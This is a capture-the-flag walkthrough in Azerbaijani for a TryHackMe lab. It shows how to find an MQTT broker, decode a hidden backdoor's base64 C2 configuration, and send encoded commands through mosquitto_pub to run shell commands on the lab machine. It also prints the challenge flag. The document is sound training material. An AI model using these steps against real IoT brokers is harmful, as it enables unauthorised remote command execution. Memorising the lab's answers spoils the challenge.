# TryHackMe — Bugged Writeup (Azərbaycan dilində)

**Otaq linki:** https://tryhackme.com/room/bugged  
**Çətinlik:** Orta  
**Mövzu:** MQTT Protocol, C2 (Command & Control), Base64, RCE

---

## Ümumi Baxış

Bu lab-da John-un smart ev şəbəkəsindəki qəribə trafiki analiz edirik. Şəbəkədə **MQTT** protokolu vasitəsilə işləyən gizli bir **backdoor (C2)** tapırıq və ondan istifadə edərək flag-i əldə edirik.

---

## MQTT Nədir?

**Message Queuing Telemetry Transport** — IoT və smart ev cihazlarının istifadə etdiyi yüngül mesajlaşma protokoludur. Port **1883**-də işləyir.

Əsas anlayışlar:
- **Topic** — mesajın göndərildiyi kanal (məsələn: `patio/lights`)
- **Publisher** — mesaj göndərən
- **Subscriber** — mesaj alan
- **Broker** — mesajları idarə edən server

---

## Addım 1: Port Scan

```bash
nmap -sV MACHINE_IP
```

**Nəticə:**
```
22/tcp   open  ssh
1883/tcp open  mqtt
```

Port **1883** — MQTT broker işləyir!

---

## Addım 2: Bütün MQTT Trafikini Dinlə

```bash
mosquitto_sub -h MACHINE_IP -t "#" -v
```

**`#`** — bütün topic-lərə subscribe olmaq deməkdir.

**Normal cihaz trafikləri görünür:**
- `patio/lights`
- `storage/thermostat`
- `frontdeck/camera`
- `kitchen/toaster`
- `livingroom/speaker`

**Şübhəli topic tapılır:**
```
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config
```

Bu topic-in payload-u **Base64 ilə encode edilib!**

---

## Addım 3: Base64 Decode

```bash
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d
```

**Nəticə:**
```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": ["HELP", "CMD", "SYS"],
  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

**C2 konfiqurasiyası tapıldı!**

| Sahə | Dəyər |
|------|-------|
| ID | `cdd1b1c0-1c40-4b0f-8e22-61b357548b7d` |
| Komandalar | `HELP`, `CMD`, `SYS` |
| pub_topic | `U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub` |
| sub_topic | `XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub` |

---

## Addım 4: C2 ilə Əlaqə Qur

Əvvəlcə cavabları dinləmək üçün **pub_topic**-i subscribe et:

**Terminal 1:**
```bash
mosquitto_sub -h MACHINE_IP -t "#" -v
```

Sonra komanda göndər — amma mesaj **Base64 formatında** olmalıdır:

**Terminal 2 — format testi:**
```bash
mosquitto_pub -h MACHINE_IP -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "HELP"
```

**Cavab gəldi (Base64):**
```
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

---

## Addım 5: Düzgün Formatda Komanda Göndər

Mesajı **Base64 encode** edib göndərməliyik:

```bash
mosquitto_pub -h MACHINE_IP -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m $(echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "id"}' | base64 -w 0)
```

**Cavab (decode edilmiş):**
```
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
```

**RCE (Remote Code Execution) işləyir!**

---

## Addım 6: Flag-i Tap

**Flag faylını axtar:**
```bash
mosquitto_pub -h MACHINE_IP -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m $(echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "find / -name flag* 2>/dev/null"}' | base64 -w 0)
```

**Cavab:** `/home/challenge/flag.txt`

**Flag-i oxu:**
```bash
mosquitto_pub -h MACHINE_IP -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m $(echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat /home/challenge/flag.txt"}' | base64 -w 0)
```

**Flag:**
```
flag{18d44fc0707ac8dc8be45bb83db54013}
```

---

## Hücumun Sxemi

```
[Biz] → mosquitto_pub → [MQTT Broker] → [Backdoor/Bot]
                                              ↓
[Biz] ← mosquitto_sub ← [MQTT Broker] ← [Cavab]
```

---

## Öyrəndiklərimiz

| Addım | Nə etdik |
|-------|----------|
| 1 | nmap ilə port 1883 (MQTT) tapdıq |
| 2 | `mosquitto_sub -t "#"` ilə bütün trafiki dinlədik |
| 3 | Şübhəli topic-i və Base64 payload-u tapdıq |
| 4 | C2 konfiqurasiyasını decode etdik |
| 5 | Düzgün formatda komanda göndərdik |
| 6 | RCE vasitəsilə flag-i tapdıq |

---

## İstifadə Olunan Alətlər

- `nmap` — port scan
- `mosquitto_sub` — MQTT topic-lərini dinləmək
- `mosquitto_pub` — MQTT topic-lərinə mesaj göndərmək
- `base64` — encode/decode

---

*Writeup Azərbaycan dilində hazırlanmışdır.*
